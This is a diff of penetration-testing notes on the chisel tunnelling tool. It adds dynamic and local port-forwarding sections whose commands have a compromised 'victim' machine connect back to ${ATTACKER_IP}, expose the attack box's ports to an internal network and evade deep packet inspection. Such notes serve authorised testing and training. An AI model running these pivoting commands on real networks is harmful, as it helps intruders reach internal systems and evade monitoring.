@@ -5,15 +5,19 @@ if you get:
 > /chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32` not found (required by ./chisel)
 go [here](https://github.com/jpillora/chisel/releases) for the appropriate release.
 
-
 Chisel makes it possible to do HTTP tunneling encrypted such that deep packet inspection won't be able to look into the details of the traffic.
+
+Note that you can state multiple forwarding statements in a single `chisel client ...` command.
+
+
+## Dynamic Port Forwarding
+
 
 We run a chisel server on `${ATTACKER_IP}` which allows us to connect back from an owned machine:
 
 ```
 chisel server --port ${ATTACKER_PORT} --reverse
 ```
-
 
 From the `${OWNED_IP0}`, run 
 
@@ -48,7 +52,34 @@ socks5 127.0.0.1 1080
 proxychains4 -f proxychains4.conf ${SOME_COMMAND} 
 ```
 
-## Remote port forward with chisel
+
+## Local Port Forwarding
+
+Start the server without the `--reverse` arg on your kali machine:
+
+```
+chisel server -p ${ATTACKER_CHISEL_PORT} 
+```
+
+
+on the victim (e.g. a machine that bridges the gap between a WAN and a DMZ network):
+
+```
+chisel client ${ATTACKER_IP}:${ATTACKER_CHISEL_PORT} ${VICTIM_LISTENING_PORT}:${TARGET_IP}:${TARGET_PORT}
+```
+
+For instance, if you want to expose ports 80 and 443 from your attack box to the internal network,
+from the bridging machine, run:
+
+```
+./chisel client ${ATTACKER_IP}:${ATTACKER_CHISEL_PORT} 8380:${ATTACKER_IP}:80 4443:${ATTACKER_IP}:443
+```
+
+Now, from the internal network, you can hit port 8380 on the bridging victim (remember to use the internal IP),
+to hit port 80 on the attack box, and port 4443 to hit port 443 on the attack box.
+
+
+## Remote Port Forwarding 
 
 if you want to expose a single port on an owned machine `IP0`, you can do:
 
